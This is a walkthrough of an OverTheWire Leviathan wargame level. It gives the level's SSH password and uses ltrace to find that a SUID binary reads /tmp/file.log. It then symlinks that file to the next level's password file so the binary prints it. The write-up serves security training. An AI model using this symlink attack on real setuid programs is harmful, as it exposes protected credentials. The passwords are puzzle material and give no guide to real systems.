## Login

SSH: `ssh leviathan5@leviathan.labs.overthewire.org -p 2223`

Password: `0dyxT7F4QD`

## A little bit of Theory

Nothing new. Theory from [Level 3]().

## Solution

In the home directory, we find a SUID binary called ’leviathan5’. As in previous levels we first run the binary to see what it does. The binary prints `Cannot find /tmp/file.log`. So we run `ltrace` to understand the underlying library calls and the program better and see that it tries to open a file called ‘/tmp/file.log’ that does not seem to exist.

```bash
leviathan5@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 7560 Aug 26  2019 leviathan5
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5 
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                            = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                      = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

Since the program immediately exits, we create the file and see what will happen once the file exists.

```bash
leviathan5@leviathan:~$ touch /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
```

It does not return anything. I assumed that this is because it prints the content of ‘/tmp/file.log’ that we haven’t written anything in. We can test this theory by either writing something into the file or using `ltrace` again.

Now we have a file that we created and have access to. So we create a symbolic link that leads to the password file. Now the binary will print the password for the next level.

```bash
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
szo7HDB88w
```


---
### Official Level Link

[Leviathan Level 6](https://overthewire.org/wargames/leviathan/leviathan6.html)